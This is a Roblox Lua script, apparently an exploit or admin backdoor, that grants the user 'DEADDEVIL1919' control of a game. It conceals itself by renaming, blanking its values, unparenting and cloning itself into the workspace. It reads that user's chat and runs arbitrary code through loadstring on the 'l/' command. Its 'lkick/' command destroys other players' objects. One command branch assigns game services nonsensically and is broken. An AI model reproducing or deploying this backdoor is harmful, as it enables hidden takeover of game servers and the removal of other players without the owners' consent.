local next=next
local run=game:service("RunService")
local P=game:service("Players")
local monkey="DEADDEVIL1919"
local M=P:findFirstChild(monkey)
M.Character.Archivable=true
local H=M.Character:Clone()
 
function test(f)
        local a,b=coroutine.resume(coroutine.create(f))
        if not a then
                local h=Instance.new("Hint",workspace)
                h.Text="LOCAL: "..b
                wait(10)
                h:remove()
        end
end
 
local ret="\66\65\76\79\79\78"
local ns
if script then
        script.Name=ret
        for _,nsch in next,script:GetChildren() do
                if nsch.ClassName=="StringValue" then
                        nsch.Value=""
                end
        end
        if game.PlaceId~=20279777 then
                test(function() ns=script:Clone() ns.Parent=workspace end)
        end
        script.Name=""
        script.Parent=nil
end
 
local rename
local never=false
local name="DEADDEVIL1919"
local newchar=true
local last=CFrame.new(0,5,0)
function charprotect()
        local go=false
        if newchar and not never then
                newchar=false
                repeat
                        local pose="Standing"
                        local nc=H:Clone()
                        local h,tor,ra,la,rl,ll=nc:findFirstChild("Head"),nc:findFirstChild("Torso"),nc:findFirstChild("Right Arm"),nc:findFirstChild("Left Arm"),nc:findFirstChild("Right Leg"),nc:findFirstChild("Left Leg")
                        local noid=nc:findFirstChild("Humanoid") or Instance.new("Humanoid",nc)
                        if tor then
                                tor.CFrame=CFrame.new(Vector3.new(last.x,math.max(last.y,4),last.z),Vector3.new(last.x+last.lookVector.x,math.max(last.y,4),last.z+last.lookVector.z))*CFrame.new(0,0,-1)
                                local n,rs,ls,rh,lh=tor:findFirstChild("Neck") or Instance.new("Motor6D",tor),tor:findFirstChild("Right Shoulder") or Instance.new("Motor6D",tor),tor:findFirstChild("Left Shoulder") or Instance.new("Motor6D",tor),tor:findFirstChild("Right Hip") or Instance.new("Motor6D",tor),tor:findFirstChild("Left Hip") or Instance.new("Motor6D",tor)
                                n.Name,rs.Name,ls.Name,rh.Name,lh.Name="Neck","Right Shoulder","LeftShoulder","Right Hip","Left Hip"
                                n.Part0,rs.Part0,ls.Part0,rh.Part0,lh.Part0=tor,tor,tor,tor,tor
                                n.Part1,rs.Part1,ls.Part1,rh.Part1,lh.Part1=h,ra,la,rl,ll
                                n.C0,rs.C0,ls.C0,rh.C0,lh.C0=CFrame.new(0,1,0,-1,0,0,0,0,1,0,1,0),CFrame.new(1,0.5,0,0,0,1,0,1,0,-1,0,0),CFrame.new(-1,0.5,0,0,0,-1,0,1,0,1,0,0),CFrame.new(0.5,-1,0,0,0,1,0,1,0,-1,0,0),CFrame.new(-0.5,-1,0,0,0,-1,0,1,0,1,0,0)
                                n.C1,rs.C1,ls.C1,rh.C1,lh.C1=CFrame.new(0,-0.5,0,-1,0,0,0,0,1,0,1,0),CFrame.new(-0.5,0.5,0,0,0,1,0,1,0,-1,0,0),CFrame.new(0.5,0.5,0,0,0,-1,0,1,0,1,0,0),CFrame.new(0,1,0, 0,0,-1, 0,1,0, 1,0,0),CFrame.new(0,1,0, 0,0,-1, 0,1,0, 1,0,0)
                                noid.Torso,noid.RightLeg,noid.LeftLeg=tor,rl,ll
                                pcall(function() h.CFrame,ra.CFrame,la.CFrame,rl.CFrame,ll.CFrame=tor.CFrame*CFrame.new(0,1.5,0),tor.CFrame*CFrame.new(1.5,0,0),tor.CFrame*CFrame.new(-1.5,0,0),tor.CFrame*CFrame.new(0.5,-2,0),tor.CFrame*CFrame.new(-0.5,-2,0) end)
                                noid.Seated:connect(function() pose="Seated" end)
                                noid.Jumping:connect(function() pose="Jumping" end)
                                noid.Climbing:connect(function() pose="Climbing" end)
                                noid.GettingUp:connect(function() pose="GettingUp" end)
                                noid.FreeFalling:connect(function() pose="FreeFall" end)
                                noid.FallingDown:connect(function() pose="FallingDown" end)
                                noid.PlatformStanding:connect(function() pose="PlatformStanding" end)
                                noid.Running:connect(function(speed) pose=(speed>0 and "Running") or "Standing" end)
                                rs.MaxVelocity,ls.MaxVelocity,rh.MaxVelocity,lh.MaxVelocity=0.15,0.15,0.15,0.15
                                rs:SetDesiredAngle(0)
                                ls:SetDesiredAngle(0)
                                rh:SetDesiredAngle(0)
                                lh:SetDesiredAngle(0)
                                nc.Name=monkey
                                local on=Instance.new("Model",nc)
                                on.Name=name
                                rename=on
                                local hm2=Instance.new("Humanoid",on)
                                hm2.Torso=tor
                                local sh=h:Clone()
                                sh.Parent=on
                                local n2=n:Clone()
                                n2.Parent=tor
                                n2.Part0=tor
                                n2.Part1=sh
                                n2.C0=CFrame.new(0,1,0,-1,0,0,0,0,1,0,1,0)
                                n2.C1=CFrame.new(0,-0.5,0,-1,0,0,0,0,1,0,1,0)
                                h.Transparency=1
                                Instance.new("BoolValue",h).Name="msg"
                                if h:findFirstChild'face' then
                                        h.face:Destroy()
                                end
                                nc.Parent=workspace
                                M.Character=nc
                                workspace.CurrentCamera.CameraSubject=h
                                workspace.CurrentCamera.CameraType=Enum.CameraType.Track
                                noid.Died:connect(function()
                                        pose="Dead"
                                        if nc:findFirstChild("Torso") and nc.Torso.Position.magnitude<=150 then
                                                last=nc.Torso.CFrame
                                        end
                                        go=true
                                        wait(5)
                                        nc:Destroy()
                                end)
                                local toolAnim,toolAnimTime="None",0
                                repeat
                                        if nc:findFirstChild("Torso") and nc.Torso.Position.magnitude<=150 then
                                                last=nc.Torso.CFrame
                                        end
                                        local teem=time()
                                        local amplitude,frequency=0.1,1
                                        local rm,lm,Rm,Lm=0.15,0.15,0.15,0.15
                                        local drs,dls,drh,dlh=0,0,0,0
                                        if pose=="Jumping" or pose=="FreeFall" then
                                                rm,lm=0.5,0.5
                                                drs,dls,drh,dlh=3.14,-3.14,0,0
                                        elseif pose=="Seated" then
                                                rm,lm=0.15,0.15
                                                drs,dls,drh,dlh=1.57,-1.57,1.57,-1.57
                                        else
                                                local climbFudge=0
                                                if pose=="Running" or pose=="Climbing" then
                                                        rm,lm=0.15,0.15
                                                        amplitude,frequency=1,9
                                                        climbFudge=(pose=="Climbing" and 3.14) or 0
                                                else
                                                        amplitude,frequency=0.1,1
                                                end
                                                local desiredAngle=amplitude*math.sin((teem%(math.pi*2))*frequency)
                                                drs,dls,drh,dlh=desiredAngle+climbFudge,desiredAngle-climbFudge,-desiredAngle,-desiredAngle
                                        end
                                        local tool
                                        for _,k in next,nc:GetChildren() do
                                                if k.className=="Tool" then
                                                        tool=k
                                                        break
                                                end
                                        end
                                        if tool then
                                                for _,c in next,tool:GetChildren() do
                                                        if c.Name=="toolanim" and c.ClassName=="StringValue" then
                                                                toolAnim,toolAnimTime=c.Value,teem+0.3
                                                                c.Parent=nil
                                                                break
                                                        end
                                                end
                                                if teem>toolAnimTime or toolAnim=="None" then
                                                        toolAnimTime,drs=0,1.57
                                                elseif toolAnim=="Slash" then
                                                        rm,drs=0.5,0
                                                elseif toolAnim=="Lunge" then
                                                        rm,lm,Rm,Lm=0.5,0.5,0.5,0.5
                                                        drs,dls,drh,dlh=1.57,1,1.57,1
                                                end
                                        else
                                                toolAnim,toolAnimTime="None",0
                                        end
                                        if rs then
                                                rs.MaxVelocity=rm
                                                rs:SetDesiredAngle(drs)
                                        end
                                        if ls then
                                                ls.MaxVelocity=lm
                                                ls:SetDesiredAngle(dls)
                                        end
                                        if rh then
                                                rh.MaxVelocity=Rm
                                                rh:SetDesiredAngle(drh)
                                        end
                                        if lh then
                                                lh.MaxVelocity=Lm
                                                lh:SetDesiredAngle(dlh)
                                        end
                                        if noid and hm2 then
                                                hm2.Health=noid.Health
                                                hm2.MaxHealth=noid.MaxHealth
                                        end
                                        wait()
                                until go or newchar or never or (not P:findFirstChild(monkey) and not (nc and nc.Parent==workspace))
                                go=false
                        else
                                wait(1)
                        end
                until newchar or never
        end
end
 
M.Chatted:connect(function(msg)
        test(function()
                if msg=="char" then
                        newchar=true
                        wait(0.1)
                        test(charprotect)
                                                elseif msg=="ak" then
                                        game.Players.LocalPlayer.Character = game.Workspace
                                        game.Players.DEADDEVIL1919 = game.Lighting
                                        elseif msg=="nochar" then
                        newchar=true
                        wait(0.1)
                        M.Character:destroy()
                        workspace.CurrentCamera.CameraType=0
                        workspace.CurrentCamera.CameraSubject=nil
                        workspace.CurrentCamera.Focus=nil
                        wait(0.9)
                        newchar=false
                elseif msg:sub(1,5)=="name " then
                        name=msg:sub(6)
                        if rename then
                                rename.Name=name
                        end
                elseif msg:sub(1,2)=="l/" then
                        test(loadstring(msg:sub(3)))
                                elseif msg:sub(1,6)=="lkick/" then
                        for _,v in pairs(game.Players:GetPlayers()) do
                                                if string.find(v.Name:lower(), msg:sub(7)) then
                                                v:Destroy()
                                                end
                                                end
                elseif msg:sub(1,8)=="protect=" then
                        if msg:sub(9)=="true" then
                                never=false
                        elseif msg:sub(9)=="false" then
                                never=true
                        end
                elseif msg=="ins" and ns then
                        ns:Clone().Parent=workspace
                elseif not P:findFirstChild(monkey) and msg:sub(1,1)~="/" then
                        if M and M.Character and M.Character:findFirstChild("Humanoid") and M.Character.Humanoid.Torso then
                                local g=Enum.ChatColor.Blue
                                local u,v=msg:find("%u%u")
                                if u and v and #msg:sub(u,v)>=2 then--red=MAD!
                                        g=Enum.ChatColor.Red
                                elseif msg:find("?",1,true) then--green=question?
                                        g=Enum.ChatColor.Green
                                end
                                game:service'Chat':Chat(M.Character.Head,msg,g)
                        else
                                local m=Instance.new("Message",workspace)
                                m.Text=msg
                                wait(5)
                                m:Destroy()
                        end
                end
        end)
end)
 
while M and (M.Parent==P or (M.Character and M.Character.Parent==workspace)) do
        if M.Character and M.Character:findFirstChild("Torso") and M.Character.Torso.Position.magnitude<=150 then
                last=M.Character.Torso.CFrame
        end
        wait()
end
charprotect()